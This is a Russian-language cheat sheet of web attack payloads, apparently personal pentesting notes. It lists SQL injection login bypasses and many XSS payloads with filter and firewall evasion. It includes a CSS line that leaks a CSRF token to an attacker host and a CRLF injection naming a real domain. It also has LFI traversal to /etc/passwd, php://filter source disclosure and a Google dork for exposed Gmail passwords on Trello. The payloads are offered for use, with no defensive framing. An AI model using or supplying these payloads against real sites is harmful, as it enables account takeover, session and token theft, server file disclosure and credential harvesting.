**SQL**

a - (Строковой входящий параметр) 
php?id=1'
php?id=1' —
b - (Числовой входящий параметр)
php?id=1 blablabla
php?id=-1
c - (Авторизация)
Под ником 'Admin' нам нужно вписать вместо него что то наподобие этого Admin' — 
Уязвимость в поле 'pass'
123' OR login='Admin' — 
d - (Оператор LIKE)
Вместо пароля просто ввести "%"

**XSS**

'":;<>/\[]<script><h1>
  
'';!--"<XSS>=&{()}

< - &lt;
> - &gt;
& - &amp;
" - &quot;
' - &#039;

: - %3A
/ - %2F

<script>alert(5)</script>

"><script>alert(5)</script>

;alert()

<a href="javascript:alert(1)">

NULL <scri%00pt>alert()</scri%00pt>

TAB <svg+src="jav%09ascript:alert(1)">

Newline <script>//>%0Aalert(1);</script>

Carriage Return <script>//>%0Dalert(1);</script>

Spaces < s c r i p t > p r o m t ( 1 ) < / s c r i p t >

/#text= NAME'); alert(document.cookie+'

reflected XSS - /?report=javascript
%3aalert(document.domain)

php?email='-alert(document.domain)-'

<script>\u0061\u006C\u0065\u0072\u0074(I)</script>

<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />

"><img src=x onerror=prompt(1);>

<script>a="get";b="URL";c="javascript:";d="alert(1);";eval(a+b+c+d);</script>

<form action="javascript:alert(document.location);"><input type="submit" /></form>

<iframe src="//www.youtube.com/embed/Ik9fCVkKeLg" frameborder="0" style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">

<div style="background:url('javascript:alert(1)')">

input[name=csrf_token][value=^a]{background-image:url('http://attack.com/log.php?a');}

XSS с помощью css:
<style>img{background-image:url('javascript:alert(1)')}</style>

Обход фаерволов:
<style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>

Polyglot XSS - Mathias Karlsson
" onclick=alert(document.cookie)//<button ‘ onclick=alert(document.cookie)//> */ alert(1)//

**Authentication bypass**

В процессе аутентификации при доступе к веб-сайту, посетив ссылку для отмены подписки.
PHPSESSID=xxx;

**Link filter protection bypass**

?url=site%E3%80%82com

**CRLF Injection**

GET /qwerty%0ASet-Cookie:%20test=qwerty;domain=.beepcar.ru HTTP/1.1

**robots.txt**

Disallow - Запрет доступа всех роботов 
Allow - Разрешает доступ к определенной части ресурса

**LFI**

/index.php?file=/../../../../../../etc/passwd 

file=/../../../../../../etc/passwd.php%00 

file=/../../../../../../etc/passwd%00.php 

index.txt при условии, что приписывается окончание .php 
index.txt/././././../...«(100-10)/2 раз».../././ 

php://filter/convert.base64-encode/resource=index 
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index

**google dork**

«site:trello.com AND intext:@gmail\.com AND intext:password»
